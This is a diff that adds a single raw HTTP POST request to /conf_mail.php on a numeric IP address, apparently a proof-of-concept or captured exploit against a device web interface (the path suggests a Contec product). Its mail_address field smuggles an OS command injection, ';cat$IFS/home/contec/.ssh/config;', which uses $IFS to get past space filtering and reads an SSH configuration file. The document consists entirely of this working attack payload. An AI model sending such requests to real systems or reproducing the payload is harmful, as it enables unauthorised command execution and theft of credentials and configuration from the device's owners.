@@ -1,0 +1,7 @@
+POST /conf_mail.php HTTP/1.1
+Host: 219.119.213.199
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Content-Length: 82
+
+mail_address=;cat$IFS/home/contec/.ssh/config;&button=%83%81%81%5B%83%8B%91%97%90M
